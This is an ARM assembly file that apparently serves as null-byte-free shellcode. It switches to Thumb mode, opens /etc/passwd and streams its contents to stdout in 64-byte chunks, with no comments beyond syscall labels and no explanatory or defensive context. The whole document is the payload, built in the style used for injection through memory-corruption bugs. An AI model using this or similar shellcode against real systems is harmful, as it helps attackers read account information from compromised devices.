.section .text
.global _start

_start:
	.code 32
	add r3, pc, #1
	bx r3

	.code 16

	// open("/etc/passwd", O_RDONLY) 
	adr r0, filename
	eor r1, r1
	strb r1, [r0, #0xb]

	mov r7, #5 // SYS_open
	swi #1

	mov r3, r0

	// read(filefd, buf, 0x40)
	readchunk:
		mov r0, r3
		mov r2, #0x40
		sub sp, #0x40
		mov r1, sp

		mov r7, #3 // SYS_read
		swi #1

		// write(stdout, buf, len(buf))
		mov r2, r0
		beq filename

		lsr r0, r2, #0x6
		
		mov r7, #4 // SYS_write
		swi #1
		b readchunk

	filename:
	.ascii "/etc/passwdx"
